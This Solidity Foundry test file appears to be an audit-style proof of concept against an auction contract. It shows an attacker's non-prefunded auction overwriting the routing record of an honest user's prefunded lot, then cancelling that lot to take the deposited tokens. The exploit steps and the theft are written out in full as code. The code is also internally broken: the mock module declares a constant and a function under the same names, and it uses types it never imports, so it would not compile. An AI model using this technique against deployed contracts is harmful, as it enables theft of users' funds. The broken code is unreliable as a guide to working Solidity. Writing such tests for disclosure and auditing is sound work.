// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Auctioneer} from "../../src/bases/Auctioneer.sol";
import {AuctionModule, Auction} from "../../src/modules/Auction.sol";
import {Module, Keycode, Veecode} from "../../src/modules/Modules.sol";
import {ICallback} from "../../src/interfaces/ICallback.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals) ERC20(name, symbol, decimals) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock Auction Module
contract MockAuctionModule is AuctionModule {
    Keycode public constant KEYCODE = Keycode.wrap("MOCK");
    Veecode public constant VEECODE = Veecode.wrap(bytes7("MOCK001"));
    
    function KEYCODE() external pure override returns (Keycode) {
        return Keycode.wrap("MOCK");
    }
    
    function VEECODE() external pure override returns (Veecode) {
        return Veecode.wrap(bytes7("MOCK001"));
    }
    
    function TYPE() external pure override returns (Type) {
        return Type.Auction;
    }
    
    function VERSION() external pure override returns (uint8) {
        return 1;
    }
    
    function auctionType() external pure override returns (AuctionType) {
        return AuctionType.Atomic;
    }
    
    function auction(
        uint96,
        AuctionParams calldata params_,
        uint8,
        uint8
    ) external pure override returns (uint96) {
        return params_.capacity;
    }
    
    function cancelAuction(uint96) external pure override {}
}

// Concrete implementation of Auctioneer for testing
contract TestAuctioneer is Auctioneer {
    mapping(Keycode => Module) public modules;
    
    function installModule(Module module_) external {
        modules[module_.KEYCODE()] = module_;
    }
    
    function _getLatestModuleIfActive(Keycode keycode_) internal view override returns (address) {
        return address(modules[keycode_]);
    }
    
    function _getModuleIfInstalled(Veecode) internal view override returns (address) {
        return address(modules[Keycode.wrap("MOCK")]);
    }
}

contract ExploitTest is Test {
    TestAuctioneer public auctioneer;
    MockAuctionModule public auctionModule;
    MockERC20 public baseToken;
    MockERC20 public quoteToken;
    
    address public honestUser;
    address public attacker;
    
    uint256 constant PREFUND_AMOUNT = 1000e18;
    
    function setUp() public {
        // Deploy contracts
        auctioneer = new TestAuctioneer();
        auctionModule = new MockAuctionModule();
        baseToken = new MockERC20("Base Token", "BASE", 18);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 18);
        
        // Setup users
        honestUser = makeAddr("honestUser");
        attacker = makeAddr("attacker");
        
        // Install the mock auction module
        auctioneer.installModule(auctionModule);
        
        // Mint tokens to honest user for prefunding
        baseToken.mint(honestUser, PREFUND_AMOUNT);
        
        // Approve auctioneer to spend honest user's tokens
        vm.prank(honestUser);
        baseToken.approve(address(auctioneer), PREFUND_AMOUNT);
    }
    
    function testExploit_LotRoutingOverwrite() public {
        // Step 1: Honest user creates a prefunded auction
        // This should be lot ID 0
        vm.startPrank(honestUser);
        
        Auctioneer.RoutingParams memory honestRouting = Auctioneer.RoutingParams({
            auctionType: Keycode.wrap("MOCK"),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: Keycode.wrap(""),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true  // Honest user prefunds the auction
        });
        
        Auction.AuctionParams memory honestParams = Auction.AuctionParams({
            start: uint48(block.timestamp),
            duration: uint48(1 days),
            capacityInQuote: false,
            capacity: uint96(PREFUND_AMOUNT),
            implParams: ""
        });
        
        // Honest user creates auction and prefunds it
        uint96 honestLotId = auctioneer.auction(honestRouting, honestParams, "");
        
        vm.stopPrank();
        
        // Verify honest user's auction was created with lot ID 0
        assertEq(honestLotId, 0, "Honest user should get lot ID 0");
        
        // Verify the auctioneer received the prefunded tokens
        assertEq(baseToken.balanceOf(address(auctioneer)), PREFUND_AMOUNT, "Auctioneer should hold prefunded tokens");
        assertEq(baseToken.balanceOf(honestUser), 0, "Honest user should have transferred all tokens");
        
        // Step 2: Attacker creates a non-prefunded auction
        // Due to the bug, this will overwrite lotRouting[0] with attacker's details
        vm.startPrank(attacker);
        
        Auctioneer.RoutingParams memory attackerRouting = Auctioneer.RoutingParams({
            auctionType: Keycode.wrap("MOCK"),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: Keycode.wrap(""),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: false  // Attacker does NOT prefund
        });
        
        Auction.AuctionParams memory attackerParams = Auction.AuctionParams({
            start: uint48(block.timestamp),
            duration: uint48(1 days),
            capacityInQuote: true,  // Different from honest user
            capacity: uint96(100e18),
            implParams: ""
        });
        
        // Attacker creates auction - this should be lot ID 1 but will overwrite lot ID 0's routing
        uint96 attackerLotId = auctioneer.auction(attackerRouting, attackerParams, "");
        
        // Verify attacker got lot ID 1
        assertEq(attackerLotId, 1, "Attacker should get lot ID 1");
        
        // Step 3: Verify the vulnerability - lotRouting[0] has been overwritten
        (address seller, uint96 funding,,,,,,,) = auctioneer.lotRouting(0);
        
        // The seller at lot 0 should now be the attacker instead of the honest user
        assertEq(seller, attacker, "VULNERABILITY: Attacker overwrote honest user's seller address");
        
        // The funding amount is still set from the honest user's prefunding
        assertEq(funding, PREFUND_AMOUNT, "Funding from honest user still exists");
        
        // Step 4: Attacker exploits by cancelling "their" auction at lot ID 0
        // Since they are now the seller of lot 0, they can cancel it and steal the funds
        uint256 attackerBalanceBefore = baseToken.balanceOf(attacker);
        
        auctioneer.cancel(0, "");
        
        uint256 attackerBalanceAfter = baseToken.balanceOf(attacker);
        
        vm.stopPrank();
        
        // Step 5: Verify the exploit succeeded
        assertEq(
            attackerBalanceAfter - attackerBalanceBefore,
            PREFUND_AMOUNT,
            "EXPLOIT SUCCESS: Attacker stole honest user's prefunded tokens"
        );
        
        // Verify auctioneer no longer holds the tokens
        assertEq(baseToken.balanceOf(address(auctioneer)), 0, "Auctioneer should have no tokens left");
        
        // Verify honest user lost their funds
        assertEq(baseToken.balanceOf(honestUser), 0, "Honest user lost their prefunded tokens");
        
        // Additional verification: Check that funding was cleared
        (, uint96 fundingAfter,,,,,,,) = auctioneer.lotRouting(0);
        assertEq(fundingAfter, 0, "Funding should be cleared after cancellation");
    }
}